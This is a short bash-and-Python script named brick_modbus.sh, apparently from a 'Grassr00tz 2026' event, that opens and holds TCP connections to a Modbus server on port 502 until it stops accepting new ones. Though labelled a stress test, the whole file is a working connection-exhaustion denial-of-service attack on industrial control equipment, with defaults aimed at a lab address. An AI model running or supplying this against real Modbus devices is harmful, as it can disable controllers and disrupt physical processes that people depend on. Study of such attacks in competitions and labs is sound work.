#!/usr/bin/env bash
# ============================================================
#  brick_modbus.sh
#  Grassr00tz 2026 — Modbus connection stress test
#
#  Opens TCP socket connections to a Modbus server and keeps them
#  open until the server stops accepting/responding to new connects.
#
#  Usage:
#    bash /root/brick_modbus.sh [host] [port]
#
#  Defaults:
#    host = 10.10.10.11
#    port = 502
# ============================================================

HOST="${1:-10.10.10.11}"
PORT="${2:-502}"

if ! command -v python3 >/dev/null 2>&1; then
  echo "[-] python3 is required but not found."
  exit 1
fi

echo "[*] Opening Modbus TCP connections to ${HOST}:${PORT}..."
python3 - <<PYEOF
import socket
import time

host = "${HOST}"
port = ${PORT}

sockets = []
count = 0

try:
    while True:
        count += 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((host, port))
            sock.settimeout(None)
            sockets.append(sock)
            if count % 10 == 0:
                print(f"[+] Opened {count} connections", flush=True)
        except Exception as exc:
            print(f"[-] Connection failed at attempt {count}: {exc}", flush=True)
            count -= 1
            sock.close()
            break

    print(f"\n[+] Server failed to accept a new connection after {count} open sockets.")
    print("[*] Keeping the successful connections open until Ctrl-C.")
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print(f"\n[!] Interrupted after {count} successful connections.")

finally:
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print("[*] Closed all sockets.")
PYEOF
